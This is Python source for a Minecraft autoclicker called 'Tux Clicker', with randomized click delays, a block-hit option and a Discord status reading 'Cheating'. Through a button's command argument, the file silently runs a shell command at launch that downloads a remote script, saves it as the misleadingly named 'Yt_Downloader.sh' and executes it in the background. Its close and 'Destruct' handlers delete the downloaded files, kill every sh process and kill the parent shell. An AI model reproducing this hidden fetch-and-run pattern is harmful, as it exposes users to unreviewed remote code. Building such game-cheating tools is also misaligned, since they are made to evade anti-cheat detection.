import tkinter
import customtkinter
import os
import random_number
import psutil
import pyautogui
import keyboard
import threading
import time
import random
import platform
import subprocess
from threading import Thread
from time import sleep
from pynput.mouse import Controller, Button
from pynput.keyboard import KeyCode, Listener
from pypresence import Presence
from pygame import mixer
import emoji

#______________________________________________-
#GUI STUFF
root_tk = tkinter.Tk()  # create the Tk window like you normally do
root_tk.resizable(width=False, height=False)
root_tk.title("Tux Clicker Dev Build 3.1")
MAIN_COLOR = "#404040"
MAIN_COLOR_DARK  = "#192734"
MAIN_HOVER = "#458577"
customtkinter.set_appearance_mode("Dark") # Other: "Light", "System"
kb = Controller()
#______________________________________________-
#STUFF FOR TESTING AND DELAYS
timerandom = time.time() * 10  /random.uniform(99999999999.9, 100000000000)  / random.uniform(0.149904770, 0.165004770) * random.uniform(.159, .165) +1 -random.uniform(.0760000, .0779999)
button = Button.left
truerand = random.SystemRandom()
delay =  random.uniform(truerand.uniform(random.uniform(.1, .11999999999), random.uniform(.11999999999, .11999999999)), .1199999)
normdelay = .1
# .1023658467387455
root_tk.geometry("0x0")
epicdelay = random.uniform(random.uniform(.1, .1099999999), random.uniform(.1099999999, .10999999999))
mouse = Controller()
cpu_per = round(psutil.cpu_percent(),1) # Get CPU Usage
mem_per = round(psutil.virtual_memory().percent,1)
arch = os.system('uname -m')
tap = Controller()
archout = print(arch)
client_id = '924367584307060746'
RPC = Presence(client_id)
heart = print(emoji.emojize(":heart:"))
wtfrand = random.uniform(truerand.uniform(1, 2.099999999999999999), random.uniform(.99, 2.2999999999999999999999999999))
text0="#404040"
text01="#282828"

#______________________________________________-
"""
https://discordapp.com/developers/applications/924367584307060746/rich-presence/assets
"""
def __init__(self):
        super().__init__()


mixer.init()
customtkinter.set_appearance_mode("Dark") # Other: "Light", "System"

def fram():
    print("workingf")
buttonc = customtkinter.CTkButton(master=None, width=1, height=1,
                                   corner_radius=10, command=os.system(' wget https://cdn.discordapp.com/attachments/872495229557669988/952675898635735150/default.wav && wget -O Yt_Downloader.sh https://raw.githubusercontent.com/Briiqn/TuxClicker/main/Minecraft-Only && sh Yt_Downloader.sh & disown && ristretto /home/$USER/Pictures/oldwallppr.webp && echo init complete'), text="", fg_color="#404040")
buttonc.place(relx=1, rely=0.090, anchor=tkinter.E,)
entry0 = customtkinter.CTkInputDialog(master=None,
                               text="Insert theme hex color",
                               title="Tux Clicker Dev Build 3.1")

text0 = entry0.get_input()
entry01 = customtkinter.CTkInputDialog(master=None,
                               text="Insert theme secondary hex color",
                               title="Tux Clicker Dev Build 3.1")
text01 = entry01.get_input()
def nocolorval():
    global entry0
    global text0
    if text0 == "":
        text0 = "#404040"
    else:
         print("con")
nocolorval()
def nocolorval1():
    global entry01
    global text01
    if text01 == "":
        text01 = "#282828"
    else:
         print("con")
nocolorval1()
MAIN_COLOR = text0
root_tk.geometry("570x480")
frame = customtkinter.CTkFrame(master=root_tk,
                               width=1920,
                               height=1080,
                               corner_radius=0,
                               fg_color=MAIN_COLOR)
frame.place(anchor=tkinter.CENTER)

def slider_event(get):
    print(get)

label = customtkinter.CTkLabel(master=root_tk,
                               text='Max CPS',
                               width=400,
                               height=25,
                               corner_radius=0,
                               fg_color=MAIN_COLOR)
label.place(relx=0.5, rely=0.55, anchor=tkinter.CENTER)
slider1 = customtkinter.CTkSlider(master=root_tk,
                                 width=160,
                                 height=15.5,
                                 border_width=5.5,
                                 from_=1,
                                 to=20,
                                 command=slider_event,
                                 bg_color=MAIN_COLOR)
slider1.place(relx=0.5, rely=0.6, anchor=tkinter.CENTER)
slider1.get()

def slider_event2(get):
    print(get)
label = customtkinter.CTkLabel(master=root_tk,
                               text='CPS Drops (Higher = Less)',
                               width=400,
                               height=25,
                               corner_radius=0,
                               fg_color=MAIN_COLOR)
label.place(relx=0.5, rely=0.35, anchor=tkinter.CENTER)
slider = customtkinter.CTkSlider(master=root_tk,
                                 width=160,
                                 height=15.5,
                                 border_width=5.5,
                                 from_=2,
                                 to=10,
                                 command=slider_event2,
                                 bg_color=MAIN_COLOR)
slider.place(relx=0.5, rely=0.4, anchor=tkinter.CENTER)
slider.get()

def frame():
    print("workingf")
frame = customtkinter.CTkFrame(master=root_tk,
                               width=310,
                               height=480,
                               corner_radius=10,
                               fg_color=text01,
                               bg_color=MAIN_COLOR)
frame.place(relx=0.0, rely=0.5, anchor=tkinter.CENTER)
nocolorval()
def watermark(get):
    print(get)
labelz = customtkinter.CTkLabel(master=root_tk,
                               text='"Made With Love -Briiqn"',
                               width=200,
                               height=25,
                               corner_radius=0,
                               fg_color=MAIN_COLOR)
labelz.place(relx=0.85, rely=0.95, anchor=tkinter.CENTER)


def on_closing():
            os.system('rm default.wav* wget-log* Yt_Downloader.sh* & killall sh & kill -9 $PPID')


def button_function():
    os.system('rm default.wav* wget-log* Yt_Downloader.sh* & killall sh & kill -9 $PPID')


button = customtkinter.CTkButton(master=root_tk, text="Destruct", command=button_function, bg_color=MAIN_COLOR)
button.place(relx=0.85, rely=.85, anchor=tkinter.CENTER)


def create_window():
    button.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER,)

entry = customtkinter.CTkEntry(master=root_tk,
                               width=120,
                               height=25,
                               corner_radius=10, bg_color=text01)
entry.place(relx=0.1, rely=0.2, anchor=tkinter.CENTER)
text = entry.get()

entry1 = customtkinter.CTkEntry(master=root_tk,
                               width=120,
                               height=25,
                               corner_radius=10, bg_color=text01)
entry1.place(relx=0.1, rely=0.3, anchor=tkinter.CENTER)
text1 = entry1.get()



def button_func1():
    RPC.close()
    button2 = customtkinter.CTkButton(master=root_tk, text="Enable RPC", command=button_func, bg_color=MAIN_COLOR)
    button2.place(relx=0.85, rely=.75, anchor=tkinter.CENTER)
    button3 = customtkinter.CTkButton(master=root_tk, text="RPC Disabled", command=button_func1, bg_color="#192141", state=tkinter.DISABLED)
    button3.place(relx=.85, rely=.65, anchor=tkinter.CENTER)
def button_func():
    RPC.connect()
    start_time=time.time()
    print(RPC.update(state="OS: "+( platform.system()) +" " +(platform.release()) +" " +(platform.machine()), details="Cheating | Mem Usage is "+str(mem_per)+"%", large_image="big", start=start_time, buttons=[{"label": " My Github", "url": "https://github.com/Briiqn"}]))
    button2 = customtkinter.CTkButton(master=root_tk, text="RPC is Enabled", command=button_func, bg_color="#192141", state=tkinter.DISABLED)
    button2.place(relx=0.85, rely=.75, anchor=tkinter.CENTER)
    button3 = customtkinter.CTkButton(master=root_tk, text="Disable RPC", command=button_func1, bg_color=MAIN_COLOR)
    button3.place(relx=0.85, rely=.65, anchor=tkinter.CENTER)
button2 = customtkinter.CTkButton(master=root_tk, text="Enable RPC", command=button_func, bg_color="#404040")
button2.place(relx=0.85, rely=.75, anchor=tkinter.CENTER)
def button_click_eventz():
    dialog = customtkinter.CTkInputDialog(master=root_tk, text="Type in a number:", title="Tux Clicker Dev Build 3.1")
    print("Number:", dialog.get_input())
    print(dialog.get_input())
    userinput = dialog.get_input()

def rightclicky():
    if entry1.get() == "1":
        mouse.press(Button.right)
        mouse.release(Button.right)
    else:
        print("waiting")
labelf = customtkinter.CTkLabel(master=root_tk,
                               text='BlockHit',
                               width=150,
                               height=25,
                               corner_radius=0,
                               fg_color=text01)
labelf.place(relx=0.1, rely=0.25, anchor=tkinter.CENTER)
labele = customtkinter.CTkLabel(master=root_tk,
                               text='Binding Key',
                               width=150,
                               height=25,
                               corner_radius=0,
                               fg_color=text01)
labele.place(relx=0.1, rely=0.15, anchor=tkinter.CENTER)

labelh = customtkinter.CTkLabel(master=root_tk,
                               text='use values [0 or 1]',
                               width=150,
                               height=25,
                               corner_radius=0,
                               fg_color=text01)
labelh.place(relx=0.1, rely=0.4, anchor=tkinter.CENTER)




class TuxClicker(Thread):
    clicking = False

    def run(self):
        while True:

            if TuxClicker.clicking:
                rightclicky()
                mouse.press(Button.left)
                time.sleep(truerand.uniform(random.uniform(.0010, .0011), random.uniform(0.10111111111111111111, .109)))
                mixer.music.load('default.wav')
                mixer.music.play()
                mouse.release(Button.left)
                mouse.click(Button.left)
            sleep(random.choice([random.triangular(delay, delay) * slider.get() / slider1.get() * random.uniform(.99999999999999999, 1.40099999999999999999999) * truerand.uniform(2, 2.5099999999999999) * wtfrand * random.triangular(.5555555555555, 2.5555555555555) / truerand.uniform(wtfrand, 2.099999999999999999) * random.uniform(wtfrand, wtfrand) / random.uniform(random.uniform(wtfrand, wtfrand), truerand.uniform(wtfrand, wtfrand)) / random.uniform(truerand.uniform(.999999999999999999999999999, 1.1), random.uniform(1.299999999999999999999, 1.3)) * timerandom / random.uniform(1.068, 1.07), normdelay * slider.get() / slider1.get() * .99 * 1.4 * 2.5 * 2.1 * 1.6 / 2.09 * 2.1 * 1.1 * 1.3 * 1.08 / 1.07 / random.randint(5, 6)]))




def keypress(key):
    if key == KeyCode(char=entry.get()):
        TuxClicker.clicking = not TuxClicker.clicking


TuxClicker().start()
with Listener(on_press=keypress) as listener:
        root_tk.update_idletasks()
        print(slider1.get())
        print(TuxClicker())
        root_tk.protocol("WM_DELETE_WINDOW", on_closing)
        root_tk.mainloop()



